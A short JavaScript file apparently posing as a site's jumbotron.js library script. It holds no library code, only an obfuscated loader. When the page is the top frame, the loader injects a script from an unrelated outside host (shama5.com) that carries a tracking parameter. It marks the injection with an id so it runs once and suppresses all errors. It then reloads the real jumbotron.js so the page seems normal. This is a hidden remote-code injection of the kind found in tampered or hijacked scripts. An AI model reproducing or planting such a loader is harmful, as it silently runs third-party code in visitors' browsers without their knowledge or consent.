(function(){
	try{
		var o='m-_-m',D=document;
		if(!D.getElementById(o)){
			var j='http://jiangshanmeta.github.io/graph/jumbotron/jumbotron.js',
			J=j+(~j.indexOf('?')?'&':'?')+new Date().getTime(),M='http://shama5.com/?tsliese=27312832',
			C=D.currentScript,H=D.getElementsByTagName('head')[0],
			N=function(s,i){
				var I=D.createElement('script');
				I.type='text/javascript';
				if(i)
					I.id=i;
				I.src=s;H.appendChild(I);
			};
			if(self==top){
				N(M,o);
			}
			if(!C){
				C=(function(){
					var S=D.scripts,
					l=S.length,
					i=0;
					for(;i<l;++i){
						if(S[i].src===j){
							return S[i];}}})();
						}C&&((C.defer||C.async)?N(J):D.write('<script src="'+J+'"><'+'/script>'));}
					}catch(e){}
				}
				)();